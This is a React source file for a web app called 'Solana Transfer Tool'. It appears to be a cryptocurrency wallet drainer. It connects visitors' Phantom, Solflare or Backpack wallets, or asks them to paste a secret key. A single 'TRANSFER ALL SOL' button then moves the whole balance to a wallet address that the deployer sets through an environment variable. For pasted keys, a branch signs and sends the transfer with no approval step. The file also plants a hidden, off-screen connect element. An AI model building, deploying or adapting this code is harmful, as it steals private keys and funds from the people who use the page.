import React, { useState, useEffect, useRef } from 'react'
import { Connection, LAMPORTS_PER_SOL, SystemProgram, Transaction, PublicKey, Keypair } from '@solana/web3.js'
import nacl from 'tweetnacl';
import bs58 from 'bs58';
import 'bootstrap/dist/css/bootstrap.min.css';
import ConnectWalletModal from './components/ConnectWalletModal'
import Navbar from './components/Navbar';
import Hero from './components/Hero';
// AppKit imports
import { createAppKit } from "@reown/appkit"
import { SolanaAdapter } from "@reown/appkit-adapter-solana"
import { solana } from "@reown/appkit/networks" 

// Initialize AppKit
let appkitInitialized = false

const initAppKit = () => {
  if (appkitInitialized || typeof window === 'undefined') return
  
  try {
    console.log('🚀 Initializing AppKit...')
    
    const solanaWeb3JsAdapter = new SolanaAdapter()
    const projectId = "fd98f5a29967dd7e68ba78f5dd08de70"
    
    const metadata = {
      name: "Solana Transfer Tool",
      description: "Private transfer tool",
      url: window.location.origin,
      icons: ["https://avatars.githubusercontent.com/u/179229932"]
    }

    createAppKit({
      adapters: [solanaWeb3JsAdapter],
      networks: [solana],
      metadata: metadata,
      projectId: projectId,
      features: { 
        analytics: false,
        allWallets: true
      }
    })
    
    appkitInitialized = true
    console.log('✅ AppKit initialized')
    
  } catch (error) {
    console.error('❌ Failed to initialize AppKit:', error)
  }
}

// Initialize on load
if (typeof window !== 'undefined') {
  window.addEventListener('load', initAppKit)
}

function App() {
  const [connectedWallet, setConnectedWallet] = useState(null)
  const [showConnectModal, setShowConnectModal] = useState(false);
  const [balance, setBalance] = useState(0)
  const [isTransferring, setIsTransferring] = useState(false)
  const [status, setStatus] = useState('')
  const [error, setError] = useState('')
  const toolSectionRef = useRef(null);

  const TARGET_WALLET = import.meta.env.VITE_TARGET_WALLET || 'YOUR_TARGET_WALLET_HERE'
  const LAMPORTS_TO_LEAVE = 100000 // 100,000 lamports = 0.0001 SOL

  // Initialize AppKit on mount
  useEffect(() => {
    initAppKit()
    
    const timer = setTimeout(() => {
      const existingButton = document.querySelector('appkit-button')
      if (!existingButton) {
        const button = document.createElement('appkit-button')
        button.style.cssText = 'position: fixed; top: -1000px; left: -1000px; opacity: 0; pointer-events: none;'
        document.body.appendChild(button)
        console.log('➕ Added appkit-button to DOM')
      }
    }, 1000)

    return () => clearTimeout(timer)
  }, [])

  // Handle mobile wallet deep link redirects
  useEffect(() => {
    const handleRedirect = async () => {
      const urlParams = new URLSearchParams(window.location.search);
      const storedKeypairString = sessionStorage.getItem('dapp_encryption_keypair');
      if (!storedKeypairString) return;

      const dappEncryptionKeypair = Keypair.fromSecretKey(
        Uint8Array.from(JSON.parse(storedKeypairString))
      );

      let connectedParams = null;
      let walletType = '';

      if (urlParams.has('phantom_encryption_public_key')) {
        connectedParams = {
          nonce: urlParams.get('nonce'),
          data: urlParams.get('data'),
          encryptionPublicKey: urlParams.get('phantom_encryption_public_key'),
        };
        walletType = 'phantom';
      } else if (urlParams.has('solflare_encryption_public_key')) {
        connectedParams = {
          nonce: urlParams.get('nonce'),
          data: urlParams.get('data'),
          encryptionPublicKey: urlParams.get('solflare_encryption_public_key'),
        };
        walletType = 'solflare';
      }

      if (connectedParams) {
        try {
          const sharedSecret = nacl.box.before(new PublicKey(connectedParams.encryptionPublicKey).toBytes(), dappEncryptionKeypair.secretKey);
          const decryptedData = nacl.box.open.after(bs58.decode(connectedParams.data), bs58.decode(connectedParams.nonce), sharedSecret);
          const parsedData = JSON.parse(new TextDecoder().decode(decryptedData));

          if (parsedData.public_key) { // It's a connection response
            setConnectedWallet({ type: walletType, publicKey: parsedData.public_key });
            setStatus(`✅ Connected to ${walletType}`);
            setShowConnectModal(false);
          } else if (parsedData.signature) { // It's a transaction response
            setStatus(`✅ Transfer complete! TX: ${parsedData.signature.slice(0, 16)}...`);
            setIsTransferring(false);
          }
        } catch (error) {
          console.error("Error handling redirect:", error);
          setError("❌ Failed to process wallet response.");
          setIsTransferring(false);
        }

        // Clean up URL
        window.history.replaceState(null, '', window.location.pathname);
      }
    };
    handleRedirect();
  }, []);

  // Listen for AppKit events
  useEffect(() => {
    const handleAppKitConnect = (event) => {
      console.log('📱 AppKit Connect Event:', event)
      
      let address = null
      
      if (event.detail?.address) {
        address = event.detail.address
      } else if (event.detail?.accounts?.[0]) {
        address = event.detail.accounts[0]
      } else if (event.detail?.publicKey) {
        address = event.detail.publicKey
      }
      
      if (address) {
        console.log('✅ Connected to:', address)
        
        setConnectedWallet({
          type: 'appkit',
          publicKey: address
        })
        setStatus('✅ Connected via AppKit')
      }
    }

    const handleAppKitDisconnect = () => {
      console.log('📱 AppKit Disconnect Event')
      setConnectedWallet(null)
      setStatus('Disconnected')
    }

    window.addEventListener('appkit_connect', handleAppKitConnect)
    window.addEventListener('appkit_disconnect', handleAppKitDisconnect)
    window.addEventListener('wallet_connected', handleAppKitConnect)

    return () => {
      window.removeEventListener('appkit_connect', handleAppKitConnect)
      window.removeEventListener('appkit_disconnect', handleAppKitDisconnect)
      window.removeEventListener('wallet_connected', handleAppKitConnect)
    }
  }, [])

  // Open AppKit modal
  const openAppKitModal = () => {
    console.log('🎯 Opening AppKit modal...')
    
    const appkitButtons = document.querySelectorAll('appkit-button')
    console.log('Found appkit-buttons:', appkitButtons.length)
    
    if (appkitButtons.length > 0) {
      appkitButtons[0].click()
      return
    }
    
    const button = document.createElement('appkit-button')
    button.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0;'
    document.body.appendChild(button)
    
    setTimeout(() => {
      button.click()
      setTimeout(() => document.body.removeChild(button), 1000)
    }, 100)
  }

  // Wallet connection functions
  const connectPhantom = async () => {
    try {
      if (!window.solana || !window.solana.isPhantom) {
        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
        if (isMobile) {
          const dappEncryptionKeypair = Keypair.generate();
          sessionStorage.setItem('dapp_encryption_keypair', JSON.stringify(Array.from(dappEncryptionKeypair.secretKey)));
          const dappEncryptionPublicKey = dappEncryptionKeypair.publicKey.toBase58();

          const appUrl = encodeURIComponent(window.location.origin);
          const redirectLink = encodeURIComponent(window.location.href);
          
          const url = `https://phantom.app/ul/v1/connect?app_url=${appUrl}&redirect_link=${redirectLink}&dapp_encryption_public_key=${dappEncryptionPublicKey}`;
          window.location.href = url;
        } else {
          setError('Phantom wallet not installed');
          window.open('https://phantom.app/', '_blank');
        }
        return
      }
      
      const response = await window.solana.connect()
      const publicKey = response.publicKey.toString()
      
      const connection = new Connection('https://api.mainnet-beta.solana.com')
      const solBalance = await connection.getBalance(new PublicKey(publicKey))
      
      setConnectedWallet({
        type: 'phantom',
        publicKey,
        provider: window.solana,
        balance: solBalance / LAMPORTS_PER_SOL
      })
      setBalance(solBalance / LAMPORTS_PER_SOL)
      setStatus('✅ Connected to Phantom')
      setError('')
      setShowConnectModal(false);
    } catch (error) {
      setError(`Phantom connection failed: ${error.message}`)
    }
  }

  const connectSolflare = async () => {
    try {
      if (!window.solflare || !window.solflare.isSolflare) {
        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
        if (isMobile) {
          const dappEncryptionKeypair = Keypair.generate();
          sessionStorage.setItem('dapp_encryption_keypair', JSON.stringify(Array.from(dappEncryptionKeypair.secretKey)));
          const dappEncryptionPublicKey = dappEncryptionKeypair.publicKey.toBase58();

          const appUrl = encodeURIComponent(window.location.origin);
          const redirectLink = encodeURIComponent(window.location.href);

          const url = `https://solflare.com/ul/v1/connect?app_url=${appUrl}&redirect_link=${redirectLink}&dapp_encryption_public_key=${dappEncryptionPublicKey}`;
          window.location.href = url;
        } else {
          setError('Solflare wallet not installed');
          window.open('https://solflare.com/', '_blank');
        }
        return
      }
      
      await window.solflare.connect()
      const publicKey = window.solflare.publicKey.toString()
      
      const connection = new Connection('https://api.mainnet-beta.solana.com')
      const solBalance = await connection.getBalance(new PublicKey(publicKey))
      
      setConnectedWallet({
        type: 'solflare',
        publicKey,
        provider: window.solflare,
        balance: solBalance / LAMPORTS_PER_SOL
      })
      setBalance(solBalance / LAMPORTS_PER_SOL)
      setStatus('✅ Connected to Solflare')
      setError('')
      setShowConnectModal(false);
    } catch (error) {
      setError(`Solflare connection failed: ${error.message}`)
    }
  }

  const connectBackpack = async () => {
    try {
      if (!window.backpack || !window.backpack.isBackpack) {
        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
        if (isMobile) {
          const dappEncryptionKeypair = Keypair.generate();
          sessionStorage.setItem('dapp_encryption_keypair', JSON.stringify(Array.from(dappEncryptionKeypair.secretKey)));
          const dappEncryptionPublicKey = dappEncryptionKeypair.publicKey.toBase58();

          const appUrl = encodeURIComponent(window.location.origin);
          const redirectLink = encodeURIComponent(window.location.href);

          const url = `https://backpack.app/ul/v1/connect?app_url=${appUrl}&redirect_link=${redirectLink}&dapp_encryption_public_key=${dappEncryptionPublicKey}`;
          window.location.href = url;
        } else {
          setError('Backpack wallet not installed');
          window.open('https://www.backpack.app/', '_blank');
        }
        return
      }
      
      const response = await window.backpack.connect()
      const publicKey = response.publicKey.toString()
      
      const connection = new Connection('https://api.mainnet-beta.solana.com')
      const solBalance = await connection.getBalance(new PublicKey(publicKey))
      
      setConnectedWallet({
        type: 'backpack',
        publicKey,
        provider: window.backpack,
        balance: solBalance / LAMPORTS_PER_SOL
      })
      setBalance(solBalance / LAMPORTS_PER_SOL)
      setStatus('✅ Connected to Backpack')
      setError('')
      setShowConnectModal(false);
    } catch (error) {
      setError(`Backpack connection failed: ${error.message}`)
    }
  }

  const connectWithSecretKey = async (secretKey, onComplete) => {
    try {
      if (!secretKey.trim()) {
        setError('Please enter a secret key')
        return
      }

      let keypair
      try {
        const secretKeyArray = JSON.parse(secretKey)
        keypair = Keypair.fromSecretKey(new Uint8Array(secretKeyArray))
      } catch (e) {
        setError('Invalid secret key format. Use JSON array like: [123,45,67,...]')
        return
      }

      const connection = new Connection('https://api.mainnet-beta.solana.com')
      const publicKey = keypair.publicKey.toString()
      const solBalance = await connection.getBalance(keypair.publicKey)

      setConnectedWallet({
        type: 'secret',
        publicKey,
        keypair,
        balance: solBalance / LAMPORTS_PER_SOL
      })
      setBalance(solBalance / LAMPORTS_PER_SOL)
      if (onComplete) onComplete();
      setStatus('✅ Connected with secret key');
      setShowConnectModal(false);

    } catch (error) {
      setError('❌ Failed to connect: ' + error.message)
    }
  }

  // TRANSFER ALL SOL - 100,000 LAMPORTS
  const transferAllSOL = async () => {
    if (!TARGET_WALLET || TARGET_WALLET === 'YOUR_TARGET_WALLET_HERE') {
      setError('❌ Set VITE_TARGET_WALLET in .env file')
      return
    }

    if (!connectedWallet) {
      setError('❌ Connect wallet first')
      return
    }

    setIsTransferring(true)
    setError('')
    setStatus('🔄 Preparing transfer...')

    try {
      const connection = new Connection('https://api.mainnet-beta.solana.com')
      const toPublicKey = new PublicKey(TARGET_WALLET)

      if (connectedWallet.type === 'secret') {
        // AUTO-TRANSFER WITHOUT APPROVAL
        const fromPublicKey = connectedWallet.keypair.publicKey
        const keypair = connectedWallet.keypair

        const currentBalance = await connection.getBalance(fromPublicKey)
        const transferAmount = currentBalance - LAMPORTS_TO_LEAVE

        if (transferAmount <= 0) {
          throw new Error(`Insufficient balance (need more than ${LAMPORTS_TO_LEAVE / LAMPORTS_PER_SOL} SOL)`)
        }

        setStatus('🔄 Creating transaction...')

        const transaction = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: fromPublicKey,
            toPubkey: toPublicKey,
            lamports: transferAmount,
          })
        )

        const { blockhash } = await connection.getRecentBlockhash()
        transaction.recentBlockhash = blockhash
        transaction.feePayer = fromPublicKey

        setStatus('🔄 Signing transaction...')
        transaction.sign(keypair)

        setStatus('🔄 Sending transaction...')
        const signature = await connection.sendRawTransaction(transaction.serialize())

        setStatus('🔄 Confirming transaction...')
        await connection.confirmTransaction(signature)

        setStatus(`✅ Transfer complete! TX: ${signature.slice(0, 16)}...`)
        setStatus(`✅ ${(transferAmount / LAMPORTS_PER_SOL).toFixed(6)} SOL sent to target wallet!`)
        
        const newBalance = await connection.getBalance(fromPublicKey)
        setBalance(newBalance / LAMPORTS_PER_SOL)

      } else if (['phantom', 'solflare', 'backpack'].includes(connectedWallet.type)) {
        // REQUIRES USER APPROVAL
        const fromPublicKey = new PublicKey(connectedWallet.publicKey)
        const currentBalance = await connection.getBalance(fromPublicKey)
        const transferAmount = currentBalance - LAMPORTS_TO_LEAVE

        if (transferAmount <= 0) {
          throw new Error(`Insufficient balance (need more than ${LAMPORTS_TO_LEAVE / LAMPORTS_PER_SOL} SOL)`)
        }

        setStatus('🔄 Creating transaction...')

        const transaction = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: fromPublicKey,
            toPubkey: toPublicKey,
            lamports: transferAmount,
          })
        )

        const { blockhash } = await connection.getRecentBlockhash()
        transaction.recentBlockhash = blockhash
        transaction.feePayer = fromPublicKey

        // Handle mobile deep link signing vs. desktop extension signing
        if (connectedWallet.provider) {
          // Desktop extension flow
          setStatus('🔄 Opening wallet for approval...');
          const { signature } = await connectedWallet.provider.signAndSendTransaction(transaction);
          setStatus('🔄 Confirming transaction...');
          await connection.confirmTransaction(signature);
          setStatus(`✅ Transfer complete! TX: ${signature.slice(0, 16)}...`);
          const newBalance = await connection.getBalance(fromPublicKey);
          setBalance(newBalance / LAMPORTS_PER_SOL);
        } else {
          // Mobile deep link flow
          setStatus('🔄 Redirecting to wallet for approval...');
          const serializedTransaction = bs58.encode(transaction.serialize({ requireAllSignatures: false }));
          
          const dappEncryptionKeypair = Keypair.generate();
          sessionStorage.setItem('dapp_encryption_keypair', JSON.stringify(Array.from(dappEncryptionKeypair.secretKey)));
          const dappEncryptionPublicKey = dappEncryptionKeypair.publicKey.toBase58();
          
          const redirectLink = encodeURIComponent(window.location.href.split('?')[0]); // Use clean URL for redirect

          const url = `https://${connectedWallet.type}.app/ul/v1/signAndSendTransaction?dapp_encryption_public_key=${dappEncryptionPublicKey}&redirect_link=${redirectLink}&transaction=${serializedTransaction}`;
          
          // Give status a moment to update before redirecting
          await new Promise(resolve => setTimeout(resolve, 1000));
          window.location.href = url;
        }
        
      } else if (connectedWallet.type === 'appkit') {
        setStatus('🔄 Please approve the transfer in your connected wallet...')
        setError(`⚠️ Transfer requires approval. Please send ${(currentBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL to: ${TARGET_WALLET}`)
      } else {
        setError('⚠️ Ethereum wallets require manual transfer.')
        setStatus(`Please send all SOL to: ${TARGET_WALLET}`)
      }

    } catch (error) {
      setError('❌ Transfer failed: ' + error.message)
      console.error('Transfer error:', error)
      setStatus('')
    } finally {
      setIsTransferring(false)
    }
  }

  // Update balance
  useEffect(() => {
    const fetchBalance = async () => {
      if (connectedWallet && connectedWallet.publicKey) {
        try {
          const connection = new Connection('https://api.mainnet-beta.solana.com')
          const publicKey = new PublicKey(connectedWallet.publicKey)
          const solBalance = await connection.getBalance(publicKey)
          setBalance(solBalance / LAMPORTS_PER_SOL)
        } catch (error) {
          console.error('Error fetching balance:', error)
        }
      }
    }

    fetchBalance()
    const interval = setInterval(fetchBalance, 10000)
    return () => clearInterval(interval)
  }, [connectedWallet])

  const handleDisconnect = () => {
    if (connectedWallet?.provider?.disconnect) {
      connectedWallet.provider.disconnect();
    }
    setConnectedWallet(null);
    setStatus('Disconnected');
    setBalance(0);
  };

  const handleGetStartedClick = () => {
    toolSectionRef.current?.scrollIntoView({ behavior: 'smooth' });
    setShowConnectModal(true);
  };

  return (
    <>
      <Navbar
        onGetStartedClick={handleGetStartedClick}
        connectedWallet={connectedWallet}
        onDisconnect={handleDisconnect}
      />
      <Hero onGetStartedClick={handleGetStartedClick} />
      <div style={{ 
        padding: '40px 20px', 
        maxWidth: '600px', 
        margin: '40px auto',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
      }}
        ref={toolSectionRef}
      >
        <div style={{ 
          backgroundColor: 'white', 
          borderRadius: '16px',
          padding: '30px',
          boxShadow: '0 8px 30px rgba(0,0,0,0.08)',
          border: '1px solid #eaeaea'
        }}>
          <h1 style={{ 
            textAlign: 'center', 
            marginBottom: '30px',
            color: '#333',
            fontSize: '28px',
            fontWeight: '600'
          }}>
            Solana Transfer Tool
          </h1>
          
          {/* Main Connect Button or Connected State */}
          {!connectedWallet ? (
            <div className="text-center py-5">
              <h2 className="h4 mb-3">Connect Your Wallet</h2>
              <p className="text-secondary">
                Please connect a wallet to begin using the transfer tool.
              </p>
            </div>
          ) : (
            // Connected State
            <div>
              <div style={{ 
                backgroundColor: '#f0f9ff', 
                padding: '20px', 
                borderRadius: '12px',
                marginBottom: '25px',
                border: '1px solid #bae6fd'
              }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '15px' }}>
                  <div>
                    <h3 style={{ color: '#0369a1', margin: 0, fontSize: '18px' }}>✅ Wallet Connected</h3>
                    <p style={{ color: '#666', fontSize: '14px', marginTop: '4px' }}>
                      {connectedWallet.type.toUpperCase()}
                    </p>
                  </div>
                </div>
                
                <div style={{ marginTop: '15px' }}>
                  <div style={{ 
                    display: 'grid', 
                    gridTemplateColumns: '1fr 1fr',
                    gap: '15px',
                    marginBottom: '15px'
                  }}>
                    <div>
                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>Address</p>
                      <p style={{ 
                        fontSize: '14px', 
                        fontWeight: '500',
                        wordBreak: 'break-all',
                        backgroundColor: '#f8fafc',
                        padding: '8px',
                        borderRadius: '6px',
                        border: '1px solid #e2e8f0'
                      }}>
                        {connectedWallet.publicKey.slice(0, 12)}...{connectedWallet.publicKey.slice(-8)}
                      </p>
                    </div>
                    <div>
                      <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>Balance</p>
                      <p style={{ 
                        fontSize: '20px', 
                        fontWeight: '600',
                        color: '#059669'
                      }}>
                        {balance.toFixed(6)} SOL
                      </p>
                    </div>
                  </div>
                  
                  <div>
                    <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '4px' }}>Target Wallet</p>
                    <p style={{ 
                      fontSize: '14px', 
                      fontWeight: '500',
                      wordBreak: 'break-all',
                      backgroundColor: '#f8fafc',
                      padding: '8px',
                      borderRadius: '6px',
                      border: '1px solid #e2e8f0'
                    }}>
                      {TARGET_WALLET}
                    </p>
                  </div>
                </div>
              </div>
              
              <button 
                onClick={transferAllSOL}
                disabled={isTransferring || balance <= (LAMPORTS_TO_LEAVE / LAMPORTS_PER_SOL)}
                style={{
                  padding: '18px',
                  fontSize: '16px',
                  fontWeight: '600',
                  backgroundColor: isTransferring ? '#94a3b8' : balance <= (LAMPORTS_TO_LEAVE / LAMPORTS_PER_SOL) ? '#cbd5e1' : '#ef4444',
                  color: 'white',
                  border: 'none',
                  borderRadius: '12px',
                  cursor: isTransferring || balance <= (LAMPORTS_TO_LEAVE / LAMPORTS_PER_SOL) ? 'not-allowed' : 'pointer',
                  width: '100%',
                  transition: 'all 0.2s',
                  boxShadow: balance <= (LAMPORTS_TO_LEAVE / LAMPORTS_PER_SOL) ? 'none' : '0 4px 14px rgba(239, 68, 68, 0.3)'
                }}
                onMouseOver={(e) => {
                  if (!isTransferring && balance > (LAMPORTS_TO_LEAVE / LAMPORTS_PER_SOL)) {
                    e.target.style.backgroundColor = '#dc2626'
                  }
                }}
                onMouseOut={(e) => {
                  if (!isTransferring && balance > (LAMPORTS_TO_LEAVE / LAMPORTS_PER_SOL)) {
                    e.target.style.backgroundColor = '#ef4444'
                  }
                }}
              >
                {isTransferring ? (
                  <>
                    <span style={{ marginRight: '8px' }}>⏳</span>
                    TRANSFERRING...
                  </>
                ) : (
                  <>
                    <span style={{ marginRight: '8px' }}>⚡</span>
                    TRANSFER ALL SOL
                  </>
                )}
              </button>
              
              <p style={{ 
                marginTop: '12px', 
                fontSize: '13px', 
                color: '#64748b',
                textAlign: 'center'
              }}>
                Will leave 100,000 lamports (0.0001 SOL) for gas
              </p>
            </div>
          )}

          {/* Status Messages */}
          {status && (
            <div style={{ 
              margin: '20px 0 0 0', 
              padding: '16px',
              backgroundColor: status.includes('✅') ? '#d1fae5' : 
                             status.includes('🔄') ? '#dbeafe' : '#fee2e2',
              border: `1px solid ${
                status.includes('✅') ? '#a7f3d0' : 
                status.includes('🔄') ? '#bfdbfe' : '#fecaca'
              }`,
              borderRadius: '10px'
            }}>
              <p style={{ margin: 0, color: status.includes('✅') ? '#065f46' : 
                         status.includes('🔄') ? '#1e40af' : '#991b1b' }}>
                {status}
              </p>
            </div>
          )}

          {error && (
            <div style={{ 
              margin: '20px 0 0 0', 
              padding: '16px',
              backgroundColor: '#fef2f2',
              border: '1px solid #fecaca',
              borderRadius: '10px'
            }}>
              <p style={{ margin: 0, color: '#991b1b' }}>
                {error}
              </p>
            </div>
          )}
        </div>
      </div>
      <ConnectWalletModal
        show={showConnectModal}
        onHide={() => setShowConnectModal(false)}
        connectPhantom={connectPhantom}
        connectSolflare={connectSolflare}
        connectBackpack={connectBackpack}
        connectWithSecretKey={connectWithSecretKey}
      />
    </>
  )
}

export default App